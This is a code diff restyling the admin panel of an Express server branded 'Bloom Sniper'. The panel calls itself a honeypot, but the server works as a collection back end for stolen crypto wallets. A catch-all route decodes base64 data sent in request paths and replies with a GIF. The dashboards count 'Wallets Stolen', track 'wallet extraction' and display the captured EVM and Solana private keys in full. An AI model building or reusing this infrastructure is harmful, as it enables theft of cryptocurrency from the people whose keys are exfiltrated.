@@ -57,59 +57,382 @@ function requireAuth(req, res, next) {
     if (isAuthenticated(req)) {
         return next();
     }
-    // Redirect to login page
     res.redirect('/admin/login?redirect=' + encodeURIComponent(req.originalUrl));
 }
 
-// CSS styles for all pages
-const commonStyles = `
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-    body { font-family: 'Inter', monospace; background: #0a0a0a; color: #0f0; padding: 20px; margin: 0; }
-    h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
-    .login-box { max-width: 400px; margin: 100px auto; border: 2px solid #0f0; padding: 40px; background: #111; }
-    .login-box h2 { margin-top: 0; text-align: center; }
+// Bloom Sniper Styles
+const bloomStyles = `
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+    
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body { 
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+        background: linear-gradient(135deg, #0a0a0a 0%, #1a1625 25%, #2d1b3e 50%, #4a2c5a 75%, rgba(255, 105, 180, 0.1) 100%);
+        color: #fff; 
+        min-height: 100vh; 
+        margin: 0; 
+        padding: 0;
+        line-height: 1.6;
+    }
+    
+    .container { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
+    
+    .header { 
+        background: rgba(26, 22, 37, 0.8); 
+        backdrop-filter: blur(20px); 
+        border-bottom: 1px solid rgba(255, 182, 193, 0.1); 
+        position: fixed; 
+        top: 0; 
+        left: 0; 
+        right: 0; 
+        z-index: 1000; 
+    }
+    
+    .header-content { 
+        display: flex; 
+        align-items: center; 
+        justify-content: space-between; 
+        height: 80px; 
+    }
+    
+    .logo { 
+        font-size: 1.75rem; 
+        font-weight: 900; 
+        color: #fff; 
+        text-shadow: rgba(255, 182, 193, 0.6) 0px 0px 30px; 
+        letter-spacing: -0.5px; 
+    }
+    
+    .logo .accent { color: rgb(255, 105, 180); text-shadow: rgba(255, 105, 180, 0.8) 0px 0px 20px; }
+    
+    .main { padding: 100px 0 40px; }
+    
+    .page-title { 
+        font-size: clamp(2rem, 5vw, 3rem); 
+        font-weight: 800; 
+        margin-bottom: 10px;
+        text-align: center;
+        text-shadow: rgba(255, 182, 193, 0.3) 0px 2px 30px;
+    }
+    
+    .page-subtitle { 
+        font-size: 1.1rem; 
+        color: rgb(229, 224, 240); 
+        text-align: center; 
+        margin-bottom: 40px;
+        opacity: 0.8;
+    }
+    
+    .btn { 
+        padding: 12px 24px; 
+        border-radius: 12px; 
+        font-weight: 600; 
+        font-size: 14px; 
+        transition: 0.3s; 
+        border: none;
+        cursor: pointer; 
+        display: inline-flex; 
+        align-items: center; 
+        gap: 8px; 
+        text-decoration: none;
+    }
+    
+    .btn-primary { 
+        background: linear-gradient(135deg, rgb(255, 105, 180), rgb(255, 20, 147), rgb(220, 20, 60)); 
+        color: white; 
+        box-shadow: rgba(255, 105, 180, 0.4) 0px 4px 15px; 
+    }
+    
+    .btn-primary:hover { 
+        transform: translateY(-2px); 
+        box-shadow: rgba(255, 105, 180, 0.5) 0px 8px 25px; 
+    }
+    
+    .btn-secondary { 
+        background: rgba(255, 255, 255, 0.08); 
+        color: #fff; 
+        border: 1px solid rgba(255, 182, 193, 0.3); 
+    }
+    
+    .btn-secondary:hover { 
+        background: rgba(255, 182, 193, 0.15); 
+        border-color: rgba(255, 182, 193, 0.6); 
+    }
+    
+    .btn-danger {
+        background: rgba(255, 0, 0, 0.2);
+        color: #ff6b6b;
+        border: 1px solid rgba(255, 0, 0, 0.3);
+    }
+    
+    .btn-danger:hover {
+        background: rgba(255, 0, 0, 0.3);
+    }
+    
+    .card { 
+        background: rgba(255, 255, 255, 0.06); 
+        border-radius: 24px; 
+        border: 1px solid rgba(255, 182, 193, 0.2); 
+        padding: 32px; 
+        margin-bottom: 24px;
+        transition: 0.4s; 
+        backdrop-filter: blur(10px); 
+    }
+    
+    .card:hover { 
+        border-color: rgba(255, 182, 193, 0.4); 
+        background: rgba(255, 255, 255, 0.08); 
+    }
+    
+    .stats-grid { 
+        display: grid; 
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
+        gap: 24px; 
+        margin-bottom: 40px;
+    }
+    
+    .stat-card { 
+        background: rgba(255, 255, 255, 0.06); 
+        border-radius: 20px; 
+        border: 1px solid rgba(255, 182, 193, 0.2); 
+        padding: 24px; 
+        text-align: center;
+        transition: 0.3s;
+    }
+    
+    .stat-card:hover {
+        transform: translateY(-4px);
+        border-color: rgba(255, 182, 193, 0.4);
+        box-shadow: rgba(255, 105, 180, 0.2) 0px 10px 30px;
+    }
+    
+    .stat-label { 
+        color: rgb(184, 179, 196); 
+        font-size: 0.9rem; 
+        margin-bottom: 8px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    
+    .stat-value { 
+        font-size: 2.5rem; 
+        font-weight: 800; 
+        color: rgb(255, 105, 180);
+        text-shadow: rgba(255, 105, 180, 0.5) 0px 0px 20px;
+    }
+    
+    .capture-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+        gap: 24px;
+    }
+    
+    .capture-card { 
+        background: rgba(255, 255, 255, 0.06); 
+        border-radius: 20px; 
+        border: 1px solid rgba(255, 182, 193, 0.2); 
+        padding: 24px; 
+        transition: 0.3s;
+    }
+    
+    .capture-card:hover {
+        border-color: rgba(255, 182, 193, 0.4);
+        transform: translateY(-4px);
+        box-shadow: rgba(255, 105, 180, 0.2) 0px 15px 40px;
+    }
+    
+    .capture-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        margin-bottom: 16px;
+        padding-bottom: 16px;
+        border-bottom: 1px solid rgba(255, 182, 193, 0.1);
+    }
+    
+    .capture-title {
+        font-size: 1.1rem;
+        font-weight: 700;
+        color: #fff;
+    }
+    
+    .capture-time {
+        font-size: 0.85rem;
+        color: rgb(184, 179, 196);
+    }
+    
+    .capture-meta {
+        margin-bottom: 16px;
+    }
+    
+    .meta-row {
+        display: flex;
+        margin-bottom: 8px;
+        font-size: 0.9rem;
+    }
+    
+    .meta-label {
+        color: rgb(255, 105, 180);
+        font-weight: 600;
+        min-width: 80px;
+    }
+    
+    .meta-value {
+        color: rgb(229, 224, 240);
+        font-family: 'JetBrains Mono', monospace;
+    }
+    
+    .wallet-list {
+        margin-top: 16px;
+    }
+    
+    .wallet-item {
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 12px;
+        padding: 16px;
+        margin-bottom: 12px;
+        border: 1px solid rgba(255, 182, 193, 0.1);
+    }
+    
+    .wallet-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 12px;
+    }
+    
+    .wallet-badge {
+        background: linear-gradient(135deg, rgb(255, 105, 180), rgb(255, 20, 147));
+        color: white;
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 0.75rem;
+        font-weight: 700;
+        text-transform: uppercase;
+    }
+    
+    .wallet-field {
+        margin-bottom: 8px;
+    }
+    
+    .wallet-field-label {
+        color: rgb(184, 179, 196);
+        font-size: 0.8rem;
+        margin-bottom: 4px;
+    }
+    
+    .wallet-field-value {
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 0.85rem;
+        word-break: break-all;
+        padding: 8px 12px;
+        background: rgba(0, 0, 0, 0.4);
+        border-radius: 8px;
+        border: 1px solid rgba(255, 182, 193, 0.1);
+    }
+    
+    .wallet-address {
+        color: rgb(34, 211, 238);
+    }
+    
+    .wallet-key {
+        color: rgb(248, 113, 113);
+    }
+    
+    .actions {
+        display: flex;
+        gap: 10px;
+        margin-top: 16px;
+    }
+    
+    .actions .btn {
+        padding: 8px 16px;
+        font-size: 0.85rem;
+    }
+    
+    .nav-bar {
+        display: flex;
+        gap: 12px;
+        margin-bottom: 30px;
+        flex-wrap: wrap;
+    }
+    
+    .login-box { 
+        max-width: 400px; 
+        margin: 100px auto; 
+        border: 2px solid rgba(255, 182, 193, 0.3); 
+        padding: 40px; 
+        background: rgba(26, 22, 37, 0.8);
+        border-radius: 24px;
+        backdrop-filter: blur(20px);
+    }
+    
+    .login-box h2 { 
+        margin-top: 0; 
+        text-align: center;
+        font-size: 1.75rem;
+        margin-bottom: 30px;
+    }
+    
     input[type="text"], input[type="password"] { 
-        width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #0f0; 
-        color: #0f0; font-family: monospace; font-size: 14px; box-sizing: border-box;
+        width: 100%; 
+        padding: 14px; 
+        margin: 10px 0; 
+        background: rgba(255, 255, 255, 0.08); 
+        border: 1px solid rgba(255, 182, 193, 0.3); 
+        color: #fff; 
+        font-family: 'Inter', sans-serif; 
+        font-size: 15px; 
+        border-radius: 12px;
+        transition: 0.3s;
     }
-    input[type="text"]:focus, input[type="password"]:focus { outline: none; border-color: #ff0; }
-    button { 
-        background: #0f0; color: #000; border: none; padding: 12px 30px; cursor: pointer; 
-        font-family: 'Inter', monospace; font-weight: bold; font-size: 14px; width: 100%; margin-top: 10px;
+    
+    input[type="text"]:focus, input[type="password"]:focus { 
+        outline: none; 
+        border-color: rgb(255, 105, 180); 
+        box-shadow: rgba(255, 105, 180, 0.3) 0px 0px 15px;
     }
-    button:hover { background: #0a0; }
-    .error { color: #f00; margin: 10px 0; text-align: center; }
-    .logout-btn { 
-        float: right; background: #f00; color: #fff; width: auto; padding: 8px 20px;
+    
+    .error { 
+        color: #ff6b6b; 
+        margin: 15px 0; 
+        text-align: center;
+        padding: 12px;
+        background: rgba(255, 0, 0, 0.1);
+        border-radius: 8px;
+        border: 1px solid rgba(255, 0, 0, 0.2);
     }
-    .logout-btn:hover { background: #a00; }
-    table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9em; }
-    th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
-    th { background: #003300; }
-    tr:hover { background: #001100; }
-    .ip { color: #ff0; font-weight: bold; }
-    .timestamp { color: #888; font-size: 0.85em; }
-    .download-btn { 
-        background: #00f; color: #fff; padding: 5px 15px; text-decoration: none; 
-        display: inline-block; font-size: 0.85em;
+    
+    .empty-state {
+        text-align: center;
+        padding: 60px 20px;
+        color: rgb(184, 179, 196);
     }
-    .download-btn:hover { background: #008; }
-    .view-btn { 
-        background: #0f0; color: #000; padding: 5px 15px; text-decoration: none; 
-        display: inline-block; font-size: 0.85em; margin-right: 5px;
+    
+    .empty-state-icon {
+        font-size: 4rem;
+        margin-bottom: 20px;
+        opacity: 0.5;
     }
-    .view-btn:hover { background: #0a0; }
-    .stats { display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap; }
-    .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 120px; }
-    .stat-box h3 { margin: 0 0 10px 0; color: #ff0; font-size: 0.9em; }
-    .stat-box .number { font-size: 2em; color: #0f0; }
-    .nav { margin: 20px 0; }
-    .nav a { color: #0f0; margin-right: 15px; }
-    pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; font-size: 0.8em; }
-    .capture-card { border: 1px solid #0f0; padding: 15px; margin: 15px 0; background: #111; }
-    .capture-card h3 { margin-top: 0; color: #ff0; }
-    .wallet-count { color: #0f0; font-weight: bold; }
-    .actions { margin-top: 10px; }
+    
+    pre { 
+        background: rgba(0, 0, 0, 0.4); 
+        padding: 16px; 
+        overflow-x: auto; 
+        border-radius: 12px;
+        border: 1px solid rgba(255, 182, 193, 0.1);
+        font-size: 0.85rem;
+        color: rgb(229, 224, 240);
+    }
+    
+    @media (max-width: 768px) {
+        .capture-grid { grid-template-columns: 1fr; }
+        .stats-grid { grid-template-columns: repeat(2, 1fr); }
+        .header-content { height: 70px; }
+        .logo { font-size: 1.5rem; }
+        .main { padding-top: 90px; }
+    }
 `;
 
 // ============================================
@@ -119,7 +442,6 @@ const commonStyles = `
 app.get('/admin/login', (req, res) => {
     logAccess(req, 'LOGIN_PAGE');
     
-    // If already logged in, redirect to admin
     if (isAuthenticated(req)) {
         return res.redirect('/admin');
     }
@@ -131,18 +453,19 @@ app.get('/admin/login', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Admin Login</title>
-        <style>${commonStyles}</style>
+        <title>Admin Login - Bloom Sniper</title>
+        <style>${bloomStyles}</style>
     </head>
     <body>
         <div class="login-box">
-            <h2>🔐 Admin Login</h2>
+            <div class="logo" style="text-align: center; margin-bottom: 10px;">Bloom <span class="accent">Sniper</span></div>
+            <h2 style="color: #fff; font-weight: 700;">Admin Login</h2>
             ${error}
             <form method="POST" action="/admin/login">
                 <input type="hidden" name="redirect" value="${redirect}">
                 <input type="text" name="username" placeholder="Username" required autofocus>
                 <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Login</button>
+                <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 20px;">Login</button>
             </form>
         </div>
     </body>
@@ -154,11 +477,8 @@ app.post('/admin/login', express.urlencoded({ extended: true }), (req, res) => {
     const { username, password, redirect } = req.body;
     
     if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
-        // Create session
         const sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
         sessions.set(sessionId, { created: Date.now() });
-        
-        // Set cookie
         res.setHeader('Set-Cookie', `sessionId=${sessionId}; HttpOnly; Path=/; Max-Age=86400`);
         logAccess(req, 'LOGIN_SUCCESS');
         res.redirect(redirect || '/admin');
@@ -179,13 +499,11 @@ app.get('/admin/logout', (req, res) => {
 // PROTECTED ADMIN ROUTES
 // ============================================
 
-// Railway health check - MUST return 200 OK
 app.get('/health', (req, res) => {
     logAccess(req, 'HEALTH_CHECK');
     res.status(200).json({ status: 'ok', msg: 'OK' });
 });
 
-// Root path - return simple OK for health checks
 app.get('/', (req, res) => {
     logAccess(req, 'ROOT');
     res.status(200).send('OK');
@@ -212,75 +530,95 @@ app.get('/admin', requireAuth, (req, res) => {
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Honeypot Dashboard</title>
-            <style>${commonStyles}</style>
+            <title>Honeypot Dashboard - Bloom Sniper</title>
+            <style>${bloomStyles}</style>
         </head>
         <body>
-            <h1>🍯 Honeypot Dashboard <a href="/admin/logout" class="logout-btn">Logout</a></h1>
-            
-            <div class="nav">
-                <a href="/admin">Dashboard</a>
-                <a href="/admin/logs">View All Captures</a>
-                <a href="/admin/logs?download=all">Download All</a>
-            </div>
-            
-            <div class="stats">
-                <div class="stat-box">
-                    <h3>Total Captures</h3>
-                    <div class="number">${captures.length}</div>
+            <header class="header">
+                <div class="container">
+                    <div class="header-content">
+                        <div class="logo">Honeypot <span class="accent">Dashboard</span></div>
+                        <div style="display: flex; gap: 12px;">
+                            <a href="/admin/logs" class="btn btn-secondary">View All</a>
+                            <a href="/admin/logout" class="btn btn-danger">Logout</a>
+                        </div>
+                    </div>
                 </div>
-                <div class="stat-box">
-                    <h3>Wallets Stolen</h3>
-                    <div class="number">${totalWallets}</div>
-                </div>
-                <div class="stat-box">
-                    <h3>Unique Attackers</h3>
-                    <div class="number">${uniqueIps.length}</div>
-                </div>
-                <div class="stat-box">
-                    <h3>Server Time</h3>
-                    <div class="number" style="font-size: 0.8em;">${new Date().toLocaleTimeString()}</div>
-                </div>
-            </div>
+            </header>
             
-            <h2>Recent Captures (Last 20)</h2>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Attacker IP</th>
-                        <th>Code</th>
-                        <th>Wallets</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    ${captures.slice(0, 20).map(c => `
-                        <tr>
-                            <td class="timestamp">${new Date(c.receivedAt).toLocaleString()}</td>
-                            <td class="ip">${c.attackerIp || 'Unknown'}</td>
-                            <td>${c.code || 'N/A'}</td>
-                            <td>${c.walletCount || c.wallets?.length || 0}</td>
-                            <td>
-                                <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="view-btn">View</a>
-                                <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="download-btn">Download</a>
-                            </td>
-                        </tr>
-                    `).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;">No captures yet</td></tr>'}
-                </tbody>
-            </table>
-            
-            <h2>Debug: Last 10 Access Logs</h2>
-            <pre>${(() => {
-                try {
-                    const logs = fs.readFileSync(path.join(LOGS_FOLDER, 'access.log'), 'utf8')
-                        .split('\n').filter(Boolean).slice(-10)
-                        .map(l => JSON.parse(l))
-                        .map(l => `[${l.timestamp}] ${l.type} from ${l.ip}`)
-                        .join('\n');
-                    return logs || 'No logs yet';
-                } catch(e) { return 'No logs file'; }
-            })()}</pre>
+            <main class="main">
+                <div class="container">
+                    <h1 class="page-title">🍯 Capture Dashboard</h1>
+                    <p class="page-subtitle">Real-time wallet extraction monitoring</p>
+                    
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-label">Total Captures</div>
+                            <div class="stat-value">${captures.length}</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-label">Wallets Stolen</div>
+                            <div class="stat-value">${totalWallets}</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-label">Unique Attackers</div>
+                            <div class="stat-value">${uniqueIps.length}</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-label">Server Time</div>
+                            <div class="stat-value" style="font-size: 1.5rem;">${new Date().toLocaleTimeString()}</div>
+                        </div>
+                    </div>
+                    
+                    <div class="nav-bar">
+                        <a href="/admin" class="btn btn-primary">Recent Captures</a>
+                        <a href="/admin/logs" class="btn btn-secondary">All Captures</a>
+                        <a href="/admin/logs?download=all" class="btn btn-secondary">⬇ Download All</a>
+                    </div>
+                    
+                    <h2 style="margin-bottom: 20px; font-size: 1.5rem; font-weight: 700;">Recent Captures</h2>
+                    
+                    <div class="capture-grid">
+                        ${captures.slice(0, 12).map(c => {
+                            const walletCount = c.wallets?.length || 0;
+                            return `
+                            <div class="capture-card">
+                                <div class="capture-header">
+                                    <div>
+                                        <div class="capture-title">${c.filename}</div>
+                                        <div class="capture-time">${new Date(c.receivedAt).toLocaleString()}</div>
+                                    </div>
+                                </div>
+                                <div class="capture-meta">
+                                    <div class="meta-row">
+                                        <span class="meta-label">IP:</span>
+                                        <span class="meta-value">${c.attackerIp || 'Unknown'}</span>
+                                    </div>
+                                    <div class="meta-row">
+                                        <span class="meta-label">Code:</span>
+                                        <span class="meta-value">${c.code || 'N/A'}</span>
+                                    </div>
+                                    <div class="meta-row">
+                                        <span class="meta-label">Wallets:</span>
+                                        <span class="meta-value" style="color: rgb(255, 105, 180); font-weight: 700;">${walletCount}</span>
+                                    </div>
+                                </div>
+                                <div class="actions">
+                                    <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="btn btn-primary">View Details</a>
+                                    <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="btn btn-secondary">Download</a>
+                                </div>
+                            </div>
+                            `;
+                        }).join('') || `
+                            <div class="empty-state" style="grid-column: 1 / -1;">
+                                <div class="empty-state-icon">📭</div>
+                                <h3>No captures yet</h3>
+                                <p>Waiting for attacker data...</p>
+                            </div>
+                        `}
+                    </div>
+                </div>
+            </main>
         </body>
         </html>`;
         
@@ -290,11 +628,10 @@ app.get('/admin', requireAuth, (req, res) => {
     }
 });
 
-// HTML Logs page with download buttons
+// HTML Logs page with all captures
 app.get('/admin/logs', requireAuth, (req, res) => {
     logAccess(req, 'ADMIN_LOGS');
     
-    // Handle download all request
     if (req.query.download === 'all') {
         const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
         const allData = files.map(f => {
@@ -324,44 +661,69 @@ app.get('/admin/logs', requireAuth, (req, res) => {
         <!DOCTYPE html>
         <html>
         <head>
-            <title>All Captures - Honeypot</title>
-            <style>${commonStyles}</style>
+            <title>All Captures - Bloom Sniper</title>
+            <style>${bloomStyles}</style>
         </head>
         <body>
-            <h1>📋 All Captures <a href="/admin/logout" class="logout-btn">Logout</a></h1>
-            
-            <div class="nav">
-                <a href="/admin">← Dashboard</a>
-                <a href="/admin/logs?download=all" style="color: #ff0;">⬇ Download All JSON</a>
-            </div>
-            
-            <div class="stats">
-                <div class="stat-box">
-                    <h3>Total Files</h3>
-                    <div class="number">${captures.length}</div>
-                </div>
-                <div class="stat-box">
-                    <h3>Total Wallets</h3>
-                    <div class="number">${totalWallets}</div>
-                </div>
-            </div>
-            
-            <h2>All Captured Data</h2>
-            
-            ${captures.map(c => `
-                <div class="capture-card">
-                    <h3>📁 ${c.filename}</h3>
-                    <p><span class="timestamp">Time:</span> ${new Date(c.receivedAt).toLocaleString()}</p>
-                    <p><span class="ip">IP:</span> ${c.attackerIp || 'Unknown'}</p>
-                    <p><span class="wallet-count">Wallets:</span> ${c.wallets?.length || 0}</p>
-                    <p>Code: ${c.code || 'N/A'}</p>
-                    <div class="actions">
-                        <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="view-btn">View Details</a>
-                        <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="download-btn">Download JSON</a>
+            <header class="header">
+                <div class="container">
+                    <div class="header-content">
+                        <div class="logo">All <span class="accent">Captures</span></div>
+                        <div style="display: flex; gap: 12px;">
+                            <a href="/admin" class="btn btn-secondary">Dashboard</a>
+                            <a href="/admin/logout" class="btn btn-danger">Logout</a>
+                        </div>
                     </div>
                 </div>
-            `).join('') || '<p style="color:#888;">No captures yet</p>'}
+            </header>
             
+            <main class="main">
+                <div class="container">
+                    <h1 class="page-title">📋 All Captured Data</h1>
+                    <p class="page-subtitle">${captures.length} files with ${totalWallets} total wallets</p>
+                    
+                    <div class="nav-bar">
+                        <a href="/admin" class="btn btn-secondary">← Dashboard</a>
+                        <a href="/admin/logs?download=all" class="btn btn-primary">⬇ Download All JSON</a>
+                    </div>
+                    
+                    <div class="capture-grid">
+                        ${captures.map(c => `
+                            <div class="capture-card">
+                                <div class="capture-header">
+                                    <div>
+                                        <div class="capture-title">${c.filename}</div>
+                                        <div class="capture-time">${new Date(c.receivedAt).toLocaleString()}</div>
+                                    </div>
+                                </div>
+                                <div class="capture-meta">
+                                    <div class="meta-row">
+                                        <span class="meta-label">IP:</span>
+                                        <span class="meta-value">${c.attackerIp || 'Unknown'}</span>
+                                    </div>
+                                    <div class="meta-row">
+                                        <span class="meta-label">Code:</span>
+                                        <span class="meta-value">${c.code || 'N/A'}</span>
+                                    </div>
+                                    <div class="meta-row">
+                                        <span class="meta-label">Wallets:</span>
+                                        <span class="meta-value" style="color: rgb(255, 105, 180); font-weight: 700;">${c.wallets?.length || 0}</span>
+                                    </div>
+                                </div>
+                                <div class="actions">
+                                    <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="btn btn-primary">View Details</a>
+                                    <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="btn btn-secondary">Download</a>
+                                </div>
+                            </div>
+                        `).join('') || `
+                            <div class="empty-state" style="grid-column: 1 / -1;">
+                                <div class="empty-state-icon">📭</div>
+                                <h3>No captures yet</h3>
+                            </div>
+                        `}
+                    </div>
+                </div>
+            </main>
         </body>
         </html>`;
         
@@ -388,7 +750,7 @@ app.get('/admin/download', requireAuth, (req, res) => {
     }
 });
 
-// View specific file
+// View specific file with wallet details
 app.get('/admin/file', requireAuth, (req, res) => {
     try {
         const filename = req.query.f;
@@ -399,45 +761,108 @@ app.get('/admin/file', requireAuth, (req, res) => {
         
         const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
         
+        // Process wallets to show correct type and fields
+        const processedWallets = (data.wallets || []).map(w => {
+            if (w.bnbKey) {
+                // EVM wallet
+                return {
+                    type: 'eBundle',
+                    public: 'N/A',
+                    private: w.bnbKey
+                };
+            } else if (w.address && w.key) {
+                // Solana wallet
+                return {
+                    type: 'sBundle',
+                    public: w.address,
+                    private: w.key
+                };
+            }
+            return { type: 'unknown', public: w.address || w.pub || 'N/A', private: w.key || w.priv || 'N/A' };
+        });
+        
         const html = `
         <!DOCTYPE html>
         <html>
         <head>
             <title>Capture: ${filename}</title>
-            <style>${commonStyles}</style>
+            <style>${bloomStyles}</style>
         </head>
         <body>
-            <h1>📋 Capture Details <a href="/admin/logout" class="logout-btn">Logout</a></h1>
-            
-            <div class="nav">
-                <a href="/admin">← Dashboard</a>
-                <a href="/admin/logs">← All Captures</a>
-                <a href="/admin/download?f=${encodeURIComponent(filename)}" style="color: #ff0;">⬇ Download JSON</a>
-            </div>
-            
-            <div class="capture-card">
-                <h3>Attacker Information</h3>
-                <p><span class="ip">IP:</span> ${data.attackerIp || 'Unknown'}</p>
-                <p><span class="timestamp">Time:</span> ${data.receivedAt}</p>
-                <p>Code: ${data.code || 'N/A'}</p>
-                <p>User Agent: ${data.userAgent || 'Unknown'}</p>
-            </div>
-            
-            <div class="capture-card">
-                <h3>Wallets (${data.wallets?.length || 0})</h3>
-                ${(data.wallets || []).map((w, i) => `
-                    <div style="border: 1px solid #333; padding: 10px; margin: 10px 0; background: #0a0a0a;">
-                        <p><strong>#${i+1} Type:</strong> ${w.type || 'unknown'}</p>
-                        <p><strong>Public:</strong> <span style="color: #0ff; word-break: break-all;">${w.pub || 'N/A'}</span></p>
-                        <p><strong>Private:</strong> <span style="color: #f00; background: #330000; padding: 2px 5px; word-break: break-all;">${w.priv || 'N/A'}</span></p>
+            <header class="header">
+                <div class="container">
+                    <div class="header-content">
+                        <div class="logo">Capture <span class="accent">Details</span></div>
+                        <div style="display: flex; gap: 12px;">
+                            <a href="/admin" class="btn btn-secondary">Dashboard</a>
+                            <a href="/admin/logs" class="btn btn-secondary">All Captures</a>
+                            <a href="/admin/logout" class="btn btn-danger">Logout</a>
+                        </div>
                     </div>
-                `).join('') || '<p>No wallets</p>'}
-            </div>
+                </div>
+            </header>
             
-            <div class="capture-card">
-                <h3>Raw JSON Data</h3>
-                <pre>${JSON.stringify(data, null, 2)}</pre>
-            </div>
+            <main class="main">
+                <div class="container">
+                    <h1 class="page-title">📋 ${filename}</h1>
+                    
+                    <div class="nav-bar">
+                        <a href="/admin" class="btn btn-secondary">← Dashboard</a>
+                        <a href="/admin/logs" class="btn btn-secondary">← All Captures</a>
+                        <a href="/admin/download?f=${encodeURIComponent(filename)}" class="btn btn-primary">⬇ Download JSON</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h2 style="margin-bottom: 20px; font-size: 1.3rem; font-weight: 700;">Attacker Information</h2>
+                        <div class="meta-row" style="margin-bottom: 12px;">
+                            <span class="meta-label">IP Address:</span>
+                            <span class="meta-value">${data.attackerIp || 'Unknown'}</span>
+                        </div>
+                        <div class="meta-row" style="margin-bottom: 12px;">
+                            <span class="meta-label">Timestamp:</span>
+                            <span class="meta-value">${new Date(data.receivedAt).toLocaleString()}</span>
+                        </div>
+                        <div class="meta-row" style="margin-bottom: 12px;">
+                            <span class="meta-label">Code:</span>
+                            <span class="meta-value">${data.code || 'N/A'}</span>
+                        </div>
+                        <div class="meta-row">
+                            <span class="meta-label">User Agent:</span>
+                            <span class="meta-value" style="font-size: 0.8rem;">${data.userAgent || 'Unknown'}</span>
+                        </div>
+                    </div>
+                    
+                    <h2 style="margin: 40px 0 20px; font-size: 1.5rem; font-weight: 700;">Wallets (${processedWallets.length})</h2>
+                    
+                    ${processedWallets.map((w, i) => `
+                        <div class="card" style="border-color: ${w.type === 'eBundle' ? 'rgba(255, 20, 147, 0.4)' : 'rgba(34, 211, 238, 0.4)'};">
+                            <div class="wallet-header">
+                                <span class="wallet-badge" style="background: ${w.type === 'eBundle' ? 'linear-gradient(135deg, rgb(255, 20, 147), rgb(220, 20, 60))' : 'linear-gradient(135deg, rgb(34, 211, 238), rgb(59, 130, 246))'};">
+                                    ${w.type}
+                                </span>
+                                <span style="color: rgb(184, 179, 196); font-size: 0.9rem;">#${i + 1}</span>
+                            </div>
+                            
+                            ${w.public !== 'N/A' ? `
+                            <div class="wallet-field">
+                                <div class="wallet-field-label">Public Address</div>
+                                <div class="wallet-field-value wallet-address">${w.public}</div>
+                            </div>
+                            ` : ''}
+                            
+                            <div class="wallet-field">
+                                <div class="wallet-field-label">Private Key</div>
+                                <div class="wallet-field-value wallet-key">${w.private}</div>
+                            </div>
+                        </div>
+                    `).join('') || '<div class="empty-state"><p>No wallets in this capture</p></div>'}
+                    
+                    <div class="card" style="margin-top: 40px;">
+                        <h2 style="margin-bottom: 20px; font-size: 1.3rem; font-weight: 700;">Raw JSON Data</h2>
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                    </div>
+                </div>
+            </main>
         </body>
         </html>`;
         
@@ -473,7 +898,6 @@ app.get('*', (req, res) => {
     const timestamp = new Date().toISOString();
     const clientIp = getClientIp(req);
     
-    // Skip if it's a file request
     if (req.path.includes('.')) {
         return res.status(404).end();
     }
@@ -490,7 +914,6 @@ app.get('*', (req, res) => {
     try {
         let decodedData = decodeURIComponent(encodedData);
         
-        // Fix base64 padding
         const padding = 4 - (decodedData.length % 4);
         if (padding !== 4) decodedData += '='.repeat(padding);
         
@@ -532,7 +955,7 @@ function sendGif(res) {
 }
 
 // ============================================
-// START SERVER - Bind to 0.0.0.0 explicitly
+// START SERVER
 // ============================================
 
 const server = app.listen(PORT, '0.0.0.0', () => {
@@ -543,7 +966,6 @@ const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`Admin User: ${ADMIN_USERNAME}`);
 });
 
-// Handle errors
 server.on('error', (err) => {
     console.error('Server error:', err);
 });
